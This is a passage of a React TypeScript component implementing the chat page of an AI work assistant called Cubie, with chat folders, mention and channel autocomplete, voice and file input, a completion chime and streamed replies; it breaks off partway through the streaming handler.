import React, { useState, useRef, useEffect, useMemo, useCallback } from 'react';
import { Link, useLocation, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { Send, Square, Timer, Volume2, VolumeX, FileText, ChevronDown, ChevronRight, ChevronLeft, User as UserIcon, Bot, PlusCircle, MessageSquare, Trash2, Menu, Sparkles, ClipboardList, Mail, TrendingUp, Folder, FolderOpen, FolderPlus, Pencil, BookOpen, Package, CalendarDays, CalendarClock, Hash, Sunrise, Sun, Sunset, Users, UsersRound, Globe, HelpCircle, Shuffle, Paperclip } from 'lucide-react';
import type { LucideIcon } from 'lucide-react';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { useAuth } from '../context/AuthContext';
import { useNotifications } from '../context/NotificationsContext';
import client, { impersonationHeaders } from '../api/client';
import { fetchSlashMenu, type SlashMenu } from '../api/meetingSkills';
import { FeedbackButtons } from '../components/FeedbackButtons';
import { ImpersonatedChat } from '../components/ImpersonatedChat';
import type { FeedbackRating } from '../components/FeedbackButtons';
import { ChatSources } from '../components/ChatSources';
import type { Citation } from '../components/ChatSources';
import { ConfirmationCard, hasConfirmation } from '../components/ConfirmationCard';
import type { ConfirmationPayload } from '../components/ConfirmationCard';
import { VoiceInputButton } from '../components/voice/VoiceInputButton';
import type { DictationInfo } from '../components/voice/VoiceInputButton';
import { appendToEditable } from '../components/voice/dictation';
import { activeToken, dropRejectedToken, readChatStreamingPref } from '../brand/storage';
import { getBrandColor } from '../brand/colors';
import {
    ACCEPTED_FILE_TYPES,
    attachFile,
    deleteChatFile,
    MAX_FILE_BYTES,
    MAX_FILES_PER_MESSAGE,
    uploadErrorMessage,
} from '../api/chatFiles';
import type { ChatAttachmentRef } from '../api/chatFiles';
import { ComposerAttachments, MessageAttachments } from '../components/chatFiles/AttachmentChips';
import type { PendingAttachment } from '../components/chatFiles/AttachmentChips';
import {
    pickSuggestedPrompts,
    RHYTHM_PART_LABELS,
    RHYTHM_PARTS,
    rhythmAudienceFor,
    rhythmPartFor,
    SALES_RHYTHM_PROMPTS,
    seededRng,
    VISIBLE_PROMPT_COUNT,
} from './chatSuggestions';
import type { RhythmPart, SuggestionGate, SuggestionIconName } from './chatSuggestions';

interface Message {
    role: 'user' | 'assistant';
    content: string;
    citations?: Citation[];
    hubspot_data?: string;
    generated_sql?: string;
    error_details?: string;
    debug?: any;
    id: string;
    // Stable DB id of the persisted assistant message. Present when the message
    // came from the server (live response or a loaded session) — gates the WGLL
    // feedback control so we never rate transient error/stopped placeholders.
    dbId?: string;
    // Files a user message carried (private to its sender; see chatFiles.ts).
    attachments?: ChatAttachmentRef[];
    // An action Cubie paused on, drawn as an approval card from what the
    // server rendered (see ConfirmationCard.tsx). Replaces the text bubble.
    confirmation?: ConfirmationPayload;
}

interface ChatSessionInfo {
    id: string;
    title: string;
    folder_id?: string | null;
    updated_at: string;
}

// UAT-03: user-defined folder for organizing chats.
interface ChatFolder {
    id: string;
    name: string;
}

// Starter prompts shown on the empty chat screen. The catalogue, the
// per-feature cap and the random spread live in chatSuggestions.ts (a leaf
// module, so they are unit-tested); this map is the one part that needs the
// component's runtime — an icon per feature group. Every SuggestionIconName
// must appear here, so adding a group without picking its icon is a type
// error rather than a blank square.
const SUGGESTION_ICONS: Record<SuggestionIconName, LucideIcon> = {
    briefing: Sunrise,
    email: Mail,
    calendar: CalendarDays,
    meetings: ClipboardList,
    crm: TrendingUp,
    knowledge: BookOpen,
    products: Package,
    slack: Hash,
    people: Users,
    web: Globe,
    help: HelpCircle,
    schedule: CalendarClock,
    teams: UsersRound,
};

// The sales daily rhythm row's icon per part of the day.
const RHYTHM_ICONS: Record<RhythmPart, LucideIcon> = {
    morning: Sunrise,
    midday: Sun,
    eod: Sunset,
};

// With the rhythm row on screen, the shuffled tour shrinks to two rows so the
// input box stays above the fold.
const VISIBLE_PROMPT_COUNT_WITH_RHYTHM = 4;

// Format an elapsed-second count as a stopwatch (m:ss), e.g. 5 -> "0:05",
// 83 -> "1:23". Used for the in-flight prompt timer (UAT-08).
function formatElapsed(totalSeconds: number): string {
    const m = Math.floor(totalSeconds / 60);
    const s = totalSeconds % 60;
    return `${m}:${String(s).padStart(2, '0')}`;
}

// UAT-09 — optional audible "ding" when a long prompt finishes.
// localStorage key for the per-user preference; only "off" disables it (default on).
const CHIME_PREF_KEY = 'cubie.chat.chimeEnabled';
// Only chime when the prompt ran longer than this — quick answers never beep,
// so the sound only fires on genuinely long waits when the user has likely
// looked away.
const CHIME_MIN_SECONDS = 30;

// Synthesize a soft two-note "ding-dong" via the Web Audio API (no audio asset
// to bundle/serve). Plays quietly. Must be driven by an already-unlocked
// AudioContext (created during a user gesture — see ensureAudioContext).
function playChime(ctx: AudioContext): void {
    const now = ctx.currentTime;
    const notes = [784, 1047]; // G5 -> C6, a gentle rising chime
    notes.forEach((freq, i) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        osc.frequency.value = freq;
        const start = now + i * 0.16;
        const end = start + 0.32;
        gain.gain.setValueAtTime(0.0001, start);
        gain.gain.exponentialRampToValueAtTime(0.15, start + 0.02); // soft attack, low volume
        gain.gain.exponentialRampToValueAtTime(0.0001, end);
        osc.connect(gain).connect(ctx.destination);
        osc.start(start);
        osc.stop(end + 0.02);
    });
}

// Developer/debug tooling in the chat — the "View Debug Logs" side panel and
// the floating 🛠 stats widget — is shown to admins only. Everyone else gets a
// clean chat with no debug affordances.
export const Chat: React.FC = () => {
    const { user, isAdmin, hasFeature } = useAuth();
    const canSeeDebug = isAdmin;
    const location = useLocation();
    const navigate = useNavigate();
    const [messages, setMessages] = useState<Message[]>([]);
    const [input, setInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [selectedLogMessage, setSelectedLogMessage] = useState<Message | null>(null);
    const [isLogPanelOpen, setIsLogPanelOpen] = useState(false);
    const [isStatsOpen, setIsStatsOpen] = useState(false);
    const [sessions, setSessions] = useState<ChatSessionInfo[]>([]);
    const [activeSessionId, setActiveSessionId] = useState<string | null>(null);
    const [isSidebarOpen, setIsSidebarOpen] = useState(true);
    /* Which conversations arrived on their own (a scheduled task ran) and have
       not been opened yet. Derived from the unread notification feed rather
       than a column on chat_sessions: the run already writes one notification
       row per result, so the unread state exists — it just had no reader. */
    const { unreadBySession, markSessionSeen } = useNotifications();

    // UAT-03: chat folders + sidebar grouping state.
    const [folders, setFolders] = useState<ChatFolder[]>([]);
    const [collapsedFolders, setCollapsedFolders] = useState<Set<string>>(new Set());
    // id of the session whose "move to folder" menu is open (null = none).
    const [folderMenuFor, setFolderMenuFor] = useState<string | null>(null);
    const [lastRequestId, setLastRequestId] = useState<string | null>(null);
    // UAT-08: live stopwatch (seconds) shown beside the loading indicator so
    // users can see how long the current prompt has been processing.
    const [elapsedSeconds, setElapsedSeconds] = useState(0);
    // UAT-09: optional completion chime. Default on; persisted in localStorage.
    const [chimeEnabled, setChimeEnabled] = useState<boolean>(() => {
        try { return localStorage.getItem(CHIME_PREF_KEY) !== 'off'; } catch { return true; }
    });
    // Single shared AudioContext, created lazily on a user gesture.
    const audioCtxRef = useRef<AudioContext | null>(null);
    const messagesEndRef = useRef<HTMLDivElement>(null);
    const inputRef = useRef<HTMLDivElement>(null);
    // Holds the AbortController for the in-flight chat request so the Stop
    // button can cancel it. Null whenever no request is pending.
    const abortControllerRef = useRef<AbortController | null>(null);

    // ── Empty-state starter prompts ──────────────────────────────────────
    // A fresh random draw per page load, then a new one whenever the reader
    // asks: starting a new conversation, or the "show me other things to ask"
    // link. Holding the SEED (not the drawn prompts) keeps the draw a pure
    // function of state — the cards move when the reader acts and at no other
    // time, and a feature verdict arriving late simply re-draws with the group
    // it just unlocked.
    const [promptSeed, setPromptSeed] = useState(() => Math.floor(Math.random() * 0x7fffffff));
    // Read the verdicts as plain booleans so the memo below depends on them
    // rather than on `hasFeature`, which is a new closure on every
    // AuthProvider render. Server-resolved, and false until /api/users/me
    // answers — a missing verdict must hide a group, never reveal one.
    const canSuggestSmartTeams = hasFeature('smart_teams');
    const canSuggestScheduledTasks = hasFeature('scheduled_tasks');
    const canDictate = hasFeature('voice_input');
    // Files in Ask Cubie: each one is read by the server as soon as it is
    // picked (dropped, or pasted), then goes out with the next message. Every
    // file is private to the person who attached it.
    const canAttach = hasFeature('chat_file_upload');
    const [pendingFiles, setPendingFiles] = useState<PendingAttachment[]>([]);
    const [dragActive, setDragActive] = useState(false);
    const fileInputRef = useRef<HTMLInputElement>(null);
    const filesReading = pendingFiles.some(p => p.status === 'reading');
    const readyFileCount = pendingFiles.filter(p => p.status === 'ready').length;
    // While the mic is busy it IS the send button: Send and the starter chips
    // are disabled and handleSend refuses everything but the dictation, so a
    // habitual Send click cannot send the typed text without the spoken words.
    const [voiceBusy, setVoiceBusy] = useState(false);
    const voiceBusyRef = useRef(false);
    // Bumped when the person opens another conversation or starts a new one —
    // never when the server assigns an id to the one they are in — so a
    // dictation can tell it was stopped in a conversation they have since left.
    const conversationEpochRef = useRef(0);
    // What the box held, and which conversation was open, when the person
    // stopped the mic. If either has changed by the time the words arrive,
    // they are left in the box rather than sent somewhere unexpected.
    const dictationContextRef = useRef<{ epoch: number; box: string } | null>(null);
    // The sales daily rhythm: the checklist routine for the current part of the
    // day, as its own row above the shuffled tour (chatSuggestions.ts). A leader
    // on the team roster gets the team version instead of the personal one.
    const rhythmAudience = rhythmAudienceFor({
        rep: hasFeature('sales_rhythm'),
        team: hasFeature('sales_rhythm_team'),
    });
    const [rhythmPart, setRhythmPart] = useState<RhythmPart>(() => rhythmPartFor(new Date()));
    const suggestedPrompts = useMemo(() => {
        // Typed as a full Record, so adding a gate to chatSuggestions.ts fails
        // the build here until its verdict is wired up — rather than quietly
        // showing that feature's prompts to everyone.
        const gates: Record<SuggestionGate, boolean> = {
            smart_teams: canSuggestSmartTeams,
            scheduled_tasks: canSuggestScheduledTasks,
        };
        return pickSuggestedPrompts({
            count: rhythmAudience ? VISIBLE_PROMPT_COUNT_WITH_RHYTHM : VISIBLE_PROMPT_COUNT,
            canUse: key => gates[key],
            rng: seededRng(promptSeed),
        });
    }, [promptSeed, canSuggestSmartTeams, canSuggestScheduledTasks, rhythmAudience]);

    // Tick the prompt stopwatch while a request is in flight (UAT-08). Resets to
    // 0 on each new request and stops the moment the response arrives, errors,
    // or is cancelled. 250ms cadence keeps the seconds display crisp without a
    // visible jump.
    useEffect(() => {
        if (!isLoading) {
            setElapsedSeconds(0);
            return;
        }
        const startedAt = Date.now();
        setElapsedSeconds(0);
        const intervalId = setInterval(() => {
            setElapsedSeconds(Math.floor((Date.now() - startedAt) / 1000));
        }, 250);
        return () => clearInterval(intervalId);
    }, [isLoading]);

    // Mention state
    const [mentionQuery, setMentionQuery] = useState<string | null>(null);
    const [mentionResults, setMentionResults] = useState<any[]>([]);
    const [mentionIndex, setMentionIndex] = useState(0);
    const [isSearchingMention, setIsSearchingMention] = useState(false);
    const [mentionError, setMentionError] = useState(false);
    const [hoveredMention, setHoveredMention] = useState<any | null>(null);
    const hoverTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

    // Slack channel autocomplete state — mirrors mention state but for `#`.
    const [channelQuery, setChannelQuery] = useState<string | null>(null);
    const [channelResults, setChannelResults] = useState<any[]>([]);
    const [channelIndex, setChannelIndex] = useState(0);
    const [isSearchingChannel, setIsSearchingChannel] = useState(false);

    // The "/" menu: the person's saved meeting skills and templates. It opens
    // only while the WHOLE message so far is "/word", so a slash inside a
    // sentence ("and/or", a link) never opens it. Picking an entry writes
    // "/slug " into the box; Cubie reads that as "run this skill".
    const canUseSkills = hasFeature('meeting_skills');
    const [slashQuery, setSlashQuery] = useState<string | null>(null);
    const [slashIndex, setSlashIndex] = useState(0);
    const [slashMenu, setSlashMenu] = useState<SlashMenu | null>(null);

    // WGLL feedback — the user's prior chat ratings keyed by message id, so a
    // reloaded conversation shows its selected faces. Best-effort, non-blocking.
    const [chatRatings, setChatRatings] = useState<Record<string, { rating: string; comment?: string }>>({});
    useEffect(() => {
        let cancelled = false;
        client.get('/api/feedback/mine', { params: { surface: 'chat' } })
            .then(res => { if (!cancelled) setChatRatings(res.data || {}); })
            .catch(() => { /* non-fatal — buttons just start unselected */ });
        return () => { cancelled = true; };
    }, []);


    useEffect(() => {
        messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [messages]);

    useEffect(() => {
        fetchSessions();
        fetchFolders();

        const params = new URLSearchParams(location.search);

        /* ?session=<id> opens an existing conversation — how a scheduled task's
           result is reached (from its Slack DM, its notification, or Settings →
           Scheduled tasks). Clear the param afterwards so a refresh doesn't
           re-load over whatever the reader has since opened. */
        const deepLinkSession = params.get('session');
        if (deepLinkSession) {
            // Same clear as clicking the row: opening a result from Slack, an
            // email or Settings has to retire its dot too, or the sidebar
            // keeps flagging a conversation the reader is looking at.
            void markSessionSeen(deepLinkSession);
            loadSession(deepLinkSession).finally(() => {
                navigate('/chat', { replace: true });
            });
            return;
        }

        // Handle incoming prompt from URL (e.g. from Homefeed Get Ready)
        const initialQuery = params.get('q');
        if (initialQuery && !isLoading && messages.length === 0) {
            // Wait a bit for the UI to settle
            setTimeout(() => {
                if (inputRef.current) {
                    inputRef.current.innerText = initialQuery;
                    setInput(initialQuery);
                    handleSend();
                    // Clear the query param so it doesn't re-trigger on refresh
                    navigate('/chat', { replace: true });
                }
            }, 500);
        }
    }, [location.search]);

    /* #ask=<question> — Cubie for Chrome's "Ask Cubie" (typed after `cubie` in
       the address bar, or right-click → Ask Cubie about this). Sent exactly the
       way ?q= is, but it arrives in the URL fragment, which the browser never
       sends to the server: the question may be text highlighted on a client's
       page, and the request logs record query strings. The fragment is dropped
       at once (path and query kept, history state untouched so the router's
       own entry survives), so a reload never asks it again. Its own effect,
       keyed on the hash, so a Cubie tab already on Chat picks it up too. */
    useEffect(() => {
        const match = /^#ask=(.*)$/s.exec(location.hash);
        if (!match) return;
        window.history.replaceState(window.history.state, '', `${location.pathname}${location.search}`);
        if (new URLSearchParams(location.search).get('session')) return;
        let question = '';
        try {
            question = decodeURIComponent(match[1]).trim();
        } catch {
            return; // a malformed fragment: nothing to ask
        }
        if (question && !isLoading && messages.length === 0) {
            setTimeout(() => {
                if (inputRef.current) {
                    inputRef.current.innerText = question;
                    setInput(question);
                    handleSend();
                }
            }, 500);
        }
        // Keyed on the hash alone: a question arrives once, and re-running on
        // the send's own state changes would ask it again.
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [location.hash]);

    /* A question asked with a voice command (components/voice/VoiceCommandBar)
       arrives as navigation state, not in the URL, so the words stay out of the
       browser history. It is sent once, as if typed into whatever conversation
       is open, and the state is dropped so Back or a refresh never asks it
       again. The id is remembered, and the send is not tied to this effect's
       cleanup: dropping the state re-runs the effect, and a cleanup that
       cancelled the send would lose the question. While an answer is still
       coming (or the mic here is busy) the words wait in the box instead. */
    const voiceAsk = (location.state as { cubieAsk?: { text?: string; id?: number } } | null)?.cubieAsk;
    const handledVoiceAsk = useRef<number | null>(null);
    useEffect(() => {
        const text = voiceAsk?.text?.trim();
        const id = voiceAsk?.id;
        if (!text || id == null || handledVoiceAsk.current === id) return;
        handledVoiceAsk.current = id;
        navigate(`${location.pathname}${location.search}`, { replace: true, state: null });
        setTimeout(() => {
            if (isLoading || voiceBusyRef.current) {
                const box = inputRef.current;
                if (box) {
                    const typed = (box.innerText || '').trim();
                    const next = typed ? `${typed} ${text}` : text;
                    box.innerText = next;
                    setInput(next);
                }
                return;
            }
            void handleSend(text);
        }, 0);
    }, [voiceAsk?.id]);

    const fetchSessions = async () => {
        try {
            const { data } = await client.get('/api/chat/sessions');
            setSessions(data);
        } catch (error) {
            console.error("Failed to load sessions:", error);
        }
    };

    // ── UAT-03: chat folders ──────────────────────────────────────
    const fetchFolders = async () => {
        try {
            const { data } = await client.get('/api/chat/folders');
            setFolders(data || []);
        } catch (error) {
            console.error("Failed to load folders:", error);
        }
    };

    const createFolder = async () => {
        const name = window.prompt('New folder name')?.trim();
        if (!name) return;
        try {
            await client.post('/api/chat/folders', { name });
            await fetchFolders();
        } catch (error) {
            console.error("Failed to create folder:", error);
        }
    };

    const renameFolder = async (e: React.MouseEvent, folderId: string, current: string) => {
        e.stopPropagation();
        const name = window.prompt('Rename folder', current)?.trim();
        if (!name || name === current) return;
        try {
            await client.patch(`/api/chat/folders/${folderId}`, { name });
            await fetchFolders();
        } catch (error) {
            console.error("Failed to rename folder:", error);
        }
    };

    const deleteFolder = async (e: React.MouseEvent, folderId: string) => {
        e.stopPropagation();
        if (!window.confirm("Delete this folder? Its chats move back to Ungrouped (they aren't deleted).")) return;
        try {
            await client.delete(`/api/chat/folders/${folderId}`);
            await Promise.all([fetchFolders(), fetchSessions()]);
        } catch (error) {
            console.error("Failed to delete folder:", error);
        }
    };

    // Move a chat into a folder, or to Ungrouped when folderId is null.
    const moveSessionToFolder = async (sessionId: string, folderId: string | null) => {
        setFolderMenuFor(null);
        try {
            await client.patch(`/api/chat/sessions/${sessionId}`, { folder_id: folderId });
            await fetchSessions();
        } catch (error) {
            console.error("Failed to move chat:", error);
        }
    };

    // Create a folder from the move-menu and drop the chat straight into it.
    const createFolderAndMove = async (sessionId: string) => {
        const name = window.prompt('New folder name')?.trim();
        if (!name) { setFolderMenuFor(null); return; }
        try {
            const { data } = await client.post('/api/chat/folders', { name });
            await fetchFolders();
            await moveSessionToFolder(sessionId, data.id);
        } catch (error) {
            console.error("Failed to create folder:", error);
            setFolderMenuFor(null);
        }
    };

    const toggleFolderCollapse = (folderId: string) => {
        setCollapsedFolders(prev => {
            const next = new Set(prev);
            if (next.has(folderId)) next.delete(folderId); else next.add(folderId);
            return next;
        });
    };

    // Close the open "move to folder" menu on any outside click. The toggle and
    // the menu itself stopPropagation, so this only fires for clicks elsewhere.
    useEffect(() => {
        if (folderMenuFor === null) return;
        const close = () => setFolderMenuFor(null);
        document.addEventListener('click', close);
        return () => document.removeEventListener('click', close);
    }, [folderMenuFor]);

    // One chat row in the sidebar, including its "move to folder" menu (UAT-03).
    const isUnreadResult = (sessionId: string) => (unreadBySession[sessionId]?.length ?? 0) > 0;

    const renderSessionRow = (session: ChatSessionInfo) => (
        <div
            key={session.id}
            onClick={() => { void markSessionSeen(session.id); loadSession(session.id); }}
            className={`relative w-full flex items-center justify-between text-left px-3 py-2 rounded-md text-sm transition-colors group cursor-pointer ${activeSessionId === session.id
                ? 'bg-gray-800 text-white font-medium'
                : 'hover:bg-gray-800 hover:text-white'
                }`}
        >
            <div className="flex items-center gap-2 overflow-hidden">
                {isUnreadResult(session.id) ? (
                    /* Replaces the chat glyph rather than sitting beside it:
                       the row is 256px wide and already carries two hover
                       buttons, so an extra element pushes long titles into an
                       ellipsis. Lavender is the sidebar's own accent (the folder
                       icons use it) — an alert colour would say a scheduled
                       result that arrived on time was a problem. */
                    <span
                        className="h-2 w-2 rounded-full bg-accent flex-shrink-0 ml-[3px] mr-[5px]"
                        title="New result — not opened yet"
                    />
                ) : (
                    <MessageSquare size={16} className={`flex-shrink-0 ${activeSessionId === session.id ? 'text-brand' : 'text-gray-500'}`} />
                )}
                <span className={`truncate ${isUnreadResult(session.id) ? 'text-white font-medium' : ''}`}>{session.title}</span>
            </div>
            <div className="flex items-center gap-1 flex-shrink-0 ml-2">
                <button
                    onClick={(e) => { e.stopPropagation(); setFolderMenuFor(folderMenuFor === session.id ? null : session.id); }}
                    className="opacity-0 group-hover:opacity-100 text-gray-500 hover:text-accent transition-all focus:outline-none"
                    title="Move to folder"
                >
                    <Folder size={14} />
                </button>
                <button
                    onClick={(e) => deleteSession(e, session.id)}
                    className="opacity-0 group-hover:opacity-100 text-gray-500 hover:text-red-400 transition-all focus:outline-none"
                    title="Delete conversation"
                >
                    <Trash2 size={14} />
                </button>
            </div>
            {folderMenuFor === session.id && (
                <div
                    onClick={(e) => e.stopPropagation()}
                    className="absolute right-2 top-full mt-1 z-50 w-52 bg-gray-800 border border-gray-700 rounded-lg shadow-2xl py-1 max-h-64 overflow-y-auto"
                >
                    <div className="px-3 py-1.5 text-[11px] uppercase tracking-wide text-gray-500">Move to…</div>
                    {folders.length === 0 && (
                        <div className="px-3 py-1.5 text-gray-500 text-xs">No folders yet</div>
                    )}
                    {folders.map(f => (
                        <button
                            key={f.id}
                            onClick={() => moveSessionToFolder(session.id, f.id)}
                            disabled={session.folder_id === f.id}
                            className={`w-full text-left px-3 py-1.5 text-sm flex items-center gap-2 hover:bg-gray-700 disabled:hover:bg-transparent ${session.folder_id === f.id ? 'text-gray-500' : 'text-gray-200'}`}
                        >
                            <Folder size={14} className="flex-shrink-0" />
                            <span className="truncate">{f.name}</span>
                            {session.folder_id === f.id && <span className="ml-auto text-[10px]">current</span>}
                        </button>
                    ))}
                    {session.folder_id && (
                        <button
                            onClick={() => moveSessionToFolder(session.id, null)}
                            className="w-full text-left px-3 py-1.5 text-sm flex items-center gap-2 text-gray-200 hover:bg-gray-700 border-t border-gray-700"
                        >
                            <MessageSquare size={14} /> Remove from folder
                        </button>
                    )}
                    <button
                        onClick={() => createFolderAndMove(session.id)}
                        className="w-full text-left px-3 py-1.5 text-sm flex items-center gap-2 text-emerald-400 hover:bg-gray-700 border-t border-gray-700"
                    >
                        <FolderPlus size={14} /> New folder…
                    </button>
                </div>
            )}
        </div>
    );

    // Effect to fetch directory results when mentionQuery changes
    useEffect(() => {
        if (mentionQuery === null) {
            setMentionResults([]);
            return;
        }
        
        const fetchMentions = async () => {
            setIsSearchingMention(true);
            setMentionError(false);
            try {
                const { data } = await client.get(`/api/directory/search?q=${encodeURIComponent(mentionQuery)}&limit=5`);
                setMentionResults(data || []);
                setMentionIndex(0);
            } catch (error) {
                console.error("Failed to fetch directory mentions", error);
                setMentionResults([]);
                setMentionError(true);
            } finally {
                setIsSearchingMention(false);
            }
        };

        const timer = setTimeout(fetchMentions, 300);
        return () => clearTimeout(timer);
    }, [mentionQuery]);

    // Re-read the "/" menu each time it opens, so a skill saved a moment ago
    // in this conversation is already listed.
    const slashOpen = slashQuery !== null && canUseSkills;
    useEffect(() => {
        if (!slashOpen) return;
        let cancelled = false;
        fetchSlashMenu()
            .then((menu) => { if (!cancelled) setSlashMenu(menu); })
            .catch(() => { if (!cancelled) setSlashMenu({ skills: [], templates: [] }); });
        return () => { cancelled = true; };
    }, [slashOpen]);

    const slashResults = useMemo(() => {
        if (!slashOpen || !slashMenu) return [];
        const q = (slashQuery || '').toLowerCase();
        const hit = (e: { slug: string; name: string }) =>
            !q || e.slug.includes(q) || e.name.toLowerCase().includes(q);
        return [
            ...slashMenu.skills.filter(hit).map((e) => ({ ...e, kind: 'Skill' as const })),
            ...slashMenu.templates.filter(hit).map((e) => ({ ...e, kind: 'Template' as const })),
        ].slice(0, 12);
    }, [slashOpen, slashMenu, slashQuery]);

    // Fetch Slack channels when channelQuery changes (mirrors @ behavior).
    useEffect(() => {
        if (channelQuery === null) {
            setChannelResults([]);
            return;
        }
        const fetchChannels = async () => {
            setIsSearchingChannel(true);
            try {
                const { data } = await client.get(
                    `/api/slack/channels/search?q=${encodeURIComponent(channelQuery)}&limit=8`
                );
                setChannelResults(Array.isArray(data) ? data : []);
                setChannelIndex(0);
            } catch (error) {
                console.error("Failed to fetch slack channels", error);
                setChannelResults([]);
            } finally {
                setIsSearchingChannel(false);
            }
        };
        const timer = setTimeout(fetchChannels, 200);
        return () => clearTimeout(timer);
    }, [channelQuery]);

    const loadSession = async (sessionId: string) => {
        conversationEpochRef.current += 1;
        try {
            setIsLoading(true);
            const { data } = await client.get(`/api/chat/sessions/${sessionId}`);
            setActiveSessionId(data.id);
            setMessages(data.messages.map((m: any, i: number) => ({
                id: m.id || `${data.id}-${i}`,
                dbId: m.id,
                role: m.role,
                content: m.content,
                /* The API returns the saved extras under `metadata_json` (see
                   backend/models/chat.py), so reading only the flat fields
                   dropped every citation on reload. Prefer the nested copy and
                   keep the flat read as a fallback. */
                citations: m.metadata_json?.citations ?? m.citations,
                hubspot_data: m.metadata_json?.hubspot_data ?? m.hubspot_data,
                generated_sql: m.metadata_json?.generated_sql ?? m.generated_sql,
                debug: m.metadata_json?.debug ?? m.debug,
                attachments: m.metadata_json?.attachments,
                confirmation: m.metadata_json?.confirmation,
            })));
            setIsSidebarOpen(false); // Close sidebar on mobile after selection
        } catch (error) {
            console.error("Failed to load session:", error);
        } finally {
            setIsLoading(false);
        }
    };

    const deleteSession = async (e: React.MouseEvent, sessionId: string) => {
        e.stopPropagation();
        if (!window.confirm("Are you sure you want to delete this conversation?")) return;
        try {
            await client.delete(`/api/chat/sessions/${sessionId}`);
            if (activeSessionId === sessionId) {
                handleNewChat();
            }
            fetchSessions();
        } catch (error) {
            console.error("Failed to delete session:", error);
        }
    };

    const handleNewChat = () => {
        conversationEpochRef.current += 1;
        setActiveSessionId(null);
        setMessages([]);
        setInput('');
        setIsSidebarOpen(false);
        setPromptSeed(n => n + 1);
    };

    const extractTextForBackend = (htmlElement: HTMLElement) => {
        let plainText = '';
        htmlElement.childNodes.forEach(node => {
            if (node.nodeType === Node.TEXT_NODE) {
                // Replace non-breaking spaces with regular spaces
                plainText += (node.textContent || '').replace(/\u00A0/g, ' ');
            } else if (node.nodeType === Node.ELEMENT_NODE) {
                const el = node as HTMLElement;
                if (el.classList.contains('mention-chip')) {
                    const name = el.dataset.name;
                    const email = el.dataset.email;
                    plainText += ` ${name} <${email}> `;
                } else if (el.classList.contains('channel-chip')) {
                    const channelName = el.dataset.channelName;
                    plainText += ` #${channelName} `;
                } else if (el.tagName === 'BR') {
                    plainText += '\n';
                } else {
                    plainText += extractTextForBackend(el);
                }
            }
        });
        return plainText;
    };

    // Lazily create + resume the AudioContext. MUST be called from within a user
    // gesture (Send click / Enter / the toggle) so the browser unlocks playback;
    // a chime fired later from an async callback then plays. (UAT-09)
    const ensureAudioContext = (): AudioContext | null => {
        try {
            if (!audioCtxRef.current) {
                const Ctor = window.AudioContext || (window as any).webkitAudioContext;
                if (!Ctor) return null;
                audioCtxRef.current = new Ctor();
            }
            if (audioCtxRef.current.state === 'suspended') void audioCtxRef.current.resume();
            return audioCtxRef.current;
        } catch {
            return null;
        }
    };

    // Play the completion chime only when enabled AND the prompt ran long enough
    // to be worth alerting (the user has likely switched away). (UAT-09)
    const chimeIfLong = (durationSec: number) => {
        if (!chimeEnabled || durationSec < CHIME_MIN_SECONDS) return;
        const ctx = audioCtxRef.current;
        if (ctx) { try { playChime(ctx); } catch { /* audio is best-effort */ } }
    };

    // Toggle the completion chime (persisted). Turning it on plays a one-shot
    // sample so the user hears what to expect, and the gesture unlocks audio. (UAT-09)
    const toggleChime = () => {
        setChimeEnabled(prev => {
            const next = !prev;
            try { localStorage.setItem(CHIME_PREF_KEY, next ? 'on' : 'off'); } catch { /* ignore */ }
            if (next) { const ctx = ensureAudioContext(); if (ctx) { try { playChime(ctx); } catch { /* ignore */ } } }
            return next;
        });
    };

    // Streaming chat via SSE (POST /api/chat/stream). On by default; a browser
    // opts out with CHAT_STREAMING_KEY (brand/storage.ts), and handleSend then
    // uses the buffered POST. Appends a placeholder assistant message and fills
    // it token-by-token, then reconciles citations / ids / debug from the
    // terminal 'done' frame.
    const streamAssistantReply = async (
        query: string,
        history: { role: string; content: string }[],
        timezone: string,
        signal: AbortSignal,
        startedAt: number,
        attachmentIds: string[],
    ): Promise<boolean> => {
        const token = activeToken();
        const resp = await fetch('/api/chat/stream', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                ...(token ? { Authorization: `Bearer ${token}` } : {}),
                ...impersonationHeaders(),
            },
            body: JSON.stringify({ query, session_id: activeSessionId, history, timezone, attachment_ids: attachmentIds }),
            signal,
        });
        if (resp.status === 401) {
            const rejected = dropRejectedToken(token ?? '');
            if (rejected === 'support') window.location.assign('/');
            else if (rejected === 'home' && window.location.pathname !== '/login') window.location.assign('/login');
            return true;
        }
        if (resp.status === 404) {
            // Streaming disabled server-side (CHAT_STREAMING_ENABLED=false) — tell
            // handleSend to fall back to the buffered /api/chat/ path.
            return false;
        }
        if (!resp.ok || !resp.body) {
            throw new Error(`Streaming request failed (HTTP ${resp.status})`);
        }

        const assistantId = (Date.now() + 1).toString();
        setMessages(prev => [...prev, { role: 'assistant', content: '', id: assistantId }]);

        const reader = resp.body.getReader();
        const decoder = new TextDecoder();
        let buffer = '';
        let acc = '';
        let done: any = null;

        for (;;) {
            const chunk = await reader.read();
            if (chunk.done) break;
            buffer += decoder.decode(chunk.value, { stream: true });
            // SSE frames are separated by a blank line; keep the trailing partial.
            const frames = buffer.split('\n\n');
            buffer = frames.pop() ?? '';
            for (const frame of frames) {
                const dataLine = frame.split('\n').find(l => l.startsWith('data:'));
                if (!dataLine) continue;
                let payload: any;
                try { payload = JSON.parse(dataLine.slice(5).trim()); } catch { continue; }
                if (payload.type === 'token') {
                    acc += payload.text ?? '';
                    setMessages(prev => prev.map(m => (m.id === assistantId ? { ...m, content: acc } : m)));
                } else if (payload.type === 'error') {
                    setMessages(prev => prev.map(m => (m.id === assistantId
                        ? { ...m, content: payload.message || 'I encountered an error. Please try again.', error_details: payload.request_id }
                        : m)));
                    return true;
                } else if (payload.type === 'done') {
                    done = payload;
                }
            }
        }

        if (!done) return true; // stream closed without a terminal frame — keep what streamed
        if (!activeSessionId && done.session_id) {
            setActiveSessionId(done.session_id);
            await fetchSessions();
        }
        if (done.request_id) setLastRequestId(done.request_id);
        const finalMessage: Message = {
            role: 'assistant',
            content: done.answer || acc,
            citations: done.citations,
            hubspot_data: done.hubspot_data,
            generated_sql: done.generated_sql,
            debug: done.debug,
            id: assistantId,
            dbId: done.message_id,
            confirmation: done.confirmation ?? undefined,
        };
